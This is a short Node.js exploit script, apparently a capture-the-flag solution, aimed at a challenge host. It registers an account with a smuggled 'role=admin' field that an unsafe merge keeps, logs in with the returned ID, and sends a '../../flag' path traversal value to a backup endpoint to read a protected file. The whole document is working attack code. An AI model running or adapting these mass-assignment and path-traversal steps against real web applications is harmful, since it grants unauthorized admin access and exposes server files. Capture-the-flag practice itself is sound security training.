
const http = require('http');
const querystring = require('querystring');

// Just send role=admin when registering, because code:
// let user = {username}; merge(user, req.body); if (!user.role) user.role='user';
// So if we send role=admin in req.body, it won't be overwritten!

const postData = querystring.stringify({
  "username": "correctadmin",
  "role": "admin"
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log("Registering user with role=admin...");
const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Registration response:");
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log(`\nGot UID: ${uid}, logging in...`);
      loginAndGetFlag(uid);
    }
  });
});
req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndGetFlag(uid) {
  const loginData = querystring.stringify({uid: uid});
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(opts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("Logged in, getting backup...");
    const backupData = querystring.stringify({file: '../../flag'});
    const backupOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/backup',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(backupData),
        'Cookie': cookie
      }
    };

    const backupReq = http.request(backupOpts, (backupRes) => {
      let body = '';
      backupRes.on('data', chunk => body += chunk);
      backupRes.on('end', () => {
        console.log("\n🏁 RESULT:");
        console.log(body);
      });
    });
    backupReq.write(backupData);
    backupReq.end();
  });
  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
